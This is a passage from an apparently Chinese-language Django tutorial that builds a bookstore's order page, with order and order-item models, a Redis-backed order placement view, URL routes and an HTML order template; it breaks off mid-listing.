class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置同步</span></span><br><span class="line">    $.ajaxSettings.async = <span class="literal">false</span></span><br><span class="line">    <span class="comment">// 发起请求，访问/cart/update/</span></span><br><span class="line">    $.post(<span class="string">'/cart/update/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (data.res == <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="comment">// alert('更新成功')</span></span><br><span class="line">            error_update = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            error_update = <span class="literal">true</span></span><br><span class="line">            alert(data.errmsg)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 设置异步</span></span><br><span class="line">    $.ajaxSettings.async = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里设置了同步，因为我们需要马上更新购物车数据，即使阻塞了其他操作也在所不惜。<br>好，购物车页面基本就开发完了。</p><h1 id="6，订单页面的开发"><a href="#6，订单页面的开发" class="headerlink" title="6，订单页面的开发"></a><a id="6">6，订单页面的开发</a></h1><h2 id="1，创建models-1"><a href="#1，创建models-1" class="headerlink" title="1，创建models"></a>1，创建models</h2><p>先来设计数据库表结构，记住表结构的设计是最重要的，因为一般情况下设计好表结构，就不再变更了。<br>我们先安装order app。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage<span class="selector-class">.py</span> startapp <span class="attribute">order</span></span><br></pre></td></tr></table></figure></p><p>然后订单信息model的设计如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> db.base_model <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderInfo</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">'''订单信息模型类'''</span></span><br><span class="line"></span><br><span class="line">    PAY_METHOD_CHOICES = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">"货到付款"</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">"微信支付"</span>),</span><br><span class="line">        (<span class="number">3</span>, <span class="string">"支付宝"</span>),</span><br><span class="line">        (<span class="number">4</span>, <span class="string">"银联支付"</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    PAY_METHODS_ENUM = &#123;</span><br><span class="line">        <span class="string">"CASH"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">"WEIXIN"</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">"ALIPAY"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="string">"UNIONPAY"</span>: <span class="number">4</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ORDER_STATUS_CHOICES = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">"待支付"</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">"待发货"</span>),</span><br><span class="line">        (<span class="number">3</span>, <span class="string">"待收货"</span>),</span><br><span class="line">        (<span class="number">4</span>, <span class="string">"待评价"</span>),</span><br><span class="line">        (<span class="number">5</span>, <span class="string">"已完成"</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    order_id = models.CharField(max_length=<span class="number">64</span>, primary_key=<span class="keyword">True</span>, verbose_name=<span class="string">'订单编号'</span>)</span><br><span class="line">    passport = models.ForeignKey(<span class="string">'users.Passport'</span>, verbose_name=<span class="string">'下单账户'</span>)</span><br><span class="line">    addr = models.ForeignKey(<span class="string">'users.Address'</span>, verbose_name=<span class="string">'收货地址'</span>)</span><br><span class="line">    total_count = models.IntegerField(default=<span class="number">1</span>, verbose_name=<span class="string">'商品总数'</span>)</span><br><span class="line">    total_price = models.DecimalField(max_digits=<span class="number">10</span>, decimal_places=<span class="number">2</span>, verbose_name=<span class="string">'商品总价'</span>)</span><br><span class="line">    transit_price = models.DecimalField(max_digits=<span class="number">10</span>, decimal_places=<span class="number">2</span>, verbose_name=<span class="string">'订单运费'</span>)</span><br><span class="line">    pay_method = models.SmallIntegerField(choices=PAY_METHOD_CHOICES, default=<span class="number">1</span>, verbose_name=<span class="string">'支付方式'</span>)</span><br><span class="line">    status = models.SmallIntegerField(choices=ORDER_STATUS_CHOICES, default=<span class="number">1</span>, verbose_name=<span class="string">'订单状态'</span>)</span><br><span class="line">    trade_id = models.CharField(max_length=<span class="number">100</span>, unique=<span class="keyword">True</span>, null=<span class="keyword">True</span>, blank=<span class="keyword">True</span>, verbose_name=<span class="string">'支付编号'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_order_info'</span></span><br></pre></td></tr></table></figure><p>由于每一笔订单都是由不同的商品组成，所以我们需要把一笔订单拆分开，来建立一个订单中每种商品的信息数据表。关系数据库的一个好处就是强约束，冗余也很少，这点比mongodb好。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderGoods</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">'''订单商品模型类'''</span></span><br><span class="line">    order = models.ForeignKey(<span class="string">'OrderInfo'</span>, verbose_name=<span class="string">'所属订单'</span>)</span><br><span class="line">    books = models.ForeignKey(<span class="string">'books.Books'</span>, verbose_name=<span class="string">'订单商品'</span>)</span><br><span class="line">    count = models.IntegerField(default=<span class="number">1</span>, verbose_name=<span class="string">'商品数量'</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">10</span>, decimal_places=<span class="number">2</span>, verbose_name=<span class="string">'商品价格'</span>)</span><br><span class="line">    <span class="comment"># comment = models.CharField(max_length=128, null=True, blank=True, verbose_name='商品评论')</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_order_books'</span></span><br></pre></td></tr></table></figure></p><p>接下来我们来做数据库迁移。别忘了在settings.py中添加order app。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python manage<span class="selector-class">.py</span> makemigrations <span class="attribute">order</span></span><br><span class="line">$ python manage<span class="selector-class">.py</span> migrate</span><br></pre></td></tr></table></figure></p><h2 id="2，开发有关订单的接口。"><a href="#2，开发有关订单的接口。" class="headerlink" title="2，开发有关订单的接口。"></a>2，开发有关订单的接口。</h2><p>我们先把订单显示页面来渲染出来。<br>先来开发后台接口。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render,redirect</span><br><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> utils.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse,JsonResponse</span><br><span class="line"><span class="keyword">from</span> users.models <span class="keyword">import</span> Address</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="keyword">from</span> order.models <span class="keyword">import</span> OrderInfo, OrderGoods</span><br><span class="line"><span class="keyword">from</span> django_redis <span class="keyword">import</span> get_redis_connection</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_place</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示提交订单页面'''</span></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    books_ids = request.POST.getlist(<span class="string">'books_ids'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 校验数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all(books_ids):</span><br><span class="line">        <span class="comment"># 跳转会购物车页面</span></span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'cart:show'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户收货地址</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    addr = Address.objects.get_default_address(passport_id=passport_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户要购买商品的信息</span></span><br><span class="line">    books_li = []</span><br><span class="line">    <span class="comment"># 商品的总数目和总金额</span></span><br><span class="line">    total_count = <span class="number">0</span></span><br><span class="line">    total_price = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    conn = get_redis_connection(<span class="string">'default'</span>)</span><br><span class="line">    cart_key = <span class="string">'cart_%d'</span> % passport_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> id <span class="keyword">in</span> books_ids:</span><br><span class="line">        <span class="comment"># 根据id获取商品的信息</span></span><br><span class="line">        books = Books.objects.get_books_by_id(books_id=id)</span><br><span class="line">        <span class="comment"># 从redis中获取用户要购买的商品的数目</span></span><br><span class="line">        count = conn.hget(cart_key, id)</span><br><span class="line">        books.count = count</span><br><span class="line">        <span class="comment"># 计算商品的小计</span></span><br><span class="line">        amount = int(count) * books.price</span><br><span class="line">        books.amount = amount</span><br><span class="line">        books_li.append(books)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 累计计算商品的总数目和总金额</span></span><br><span class="line">        total_count += int(count)</span><br><span class="line">        total_price += books.amount</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 商品运费和实付款</span></span><br><span class="line">    transit_price = <span class="number">10</span></span><br><span class="line">    total_pay = total_price + transit_price</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1,2,3</span></span><br><span class="line">    books_ids = <span class="string">','</span>.join(books_ids)</span><br><span class="line">    <span class="comment"># 组织模板上下文</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'addr'</span>: addr,</span><br><span class="line">        <span class="string">'books_li'</span>: books_li,</span><br><span class="line">        <span class="string">'total_count'</span>: total_count,</span><br><span class="line">        <span class="string">'total_price'</span>: total_price,</span><br><span class="line">        <span class="string">'transit_price'</span>: transit_price,</span><br><span class="line">        <span class="string">'total_pay'</span>: total_pay,</span><br><span class="line">        <span class="string">'books_ids'</span>: books_ids,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用模板</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'order/place_order.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line">    url(<span class="string">r'^order/'</span>, include(<span class="string">'order.urls'</span>, namespace=<span class="string">'order'</span>)), <span class="comment"># 订单模块</span></span><br></pre></td></tr></table></figure></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># order/urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> order <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^place/$'</span>, views.order_place, name=<span class="string">'place'</span>), <span class="comment"># 订单提交页面</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>然后将place_order.html拷贝到templates/order文件夹下。并用继承base.html的方式来改写。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书店-首页&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>确认收货地址<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>寄送到：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">checked</span>=<span class="string">""</span>&gt;</span>北京市 海淀区 东北旺西路8号中关村软件园 （李思 收） 182****7528<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user_center_site.html"</span> <span class="attr">class</span>=<span class="string">"edit_site"</span>&gt;</span>编辑收货地址<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>支付方式<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pay_style_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"cash"</span>&gt;</span>货到付款<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"weixin"</span>&gt;</span>微信支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"zhifubao"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"pay_style"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"bank"</span>&gt;</span>银行卡支付<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>商品列表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list_th clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>商品名称<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span>商品单位<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>商品价格<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>小计<span class="tag">&lt;/<span class="name">li</span>&gt;</span>       </span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list_td clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span>            </span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book012.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>计算机程序设计艺术<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>册<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>25.80元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col06"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col07"</span>&gt;</span>25.80元<span class="tag">&lt;/<span class="name">li</span>&gt;</span>   </span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list_td clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col01"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col02"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"images/book/book003.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col03"</span>&gt;</span>Python Cookbook<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col04"</span>&gt;</span>册<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col05"</span>&gt;</span>16.80元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col06"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"col07"</span>&gt;</span>16.80元<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"common_title"</span>&gt;</span>总金额结算<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"common_list_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"settle_con"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"total_book_count"</span>&gt;</span>共<span class="tag">&lt;<span class="name">em</span>&gt;</span>2<span class="tag">&lt;/<span class="name">em</span>&gt;</span>件商品，总金额<span class="tag">&lt;<span class="name">b</span>&gt;</span>42.60元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"transit"</span>&gt;</span>运费：<span class="tag">&lt;<span class="name">b</span>&gt;</span>10元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"total_pay"</span>&gt;</span>实付款：<span class="tag">&lt;<span class="name">b</span>&gt;</span>52.60元<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"order_submit clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">id</span>=<span class="string">"order_btn"</span> <span class="attr">books_ids</span>=<span class="string">"&#123;&#123; books_ids &#125;&#125;"</span>&gt;</span>提交订单<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br><span class="line">&#123;% block bottom %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popup_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popup"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>订单提交成功！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mask"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock bottom %&#125;</span><br></pre></td></tr></table></figure></p><p>然后将模板中的对应元素修改为后端渲染的代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 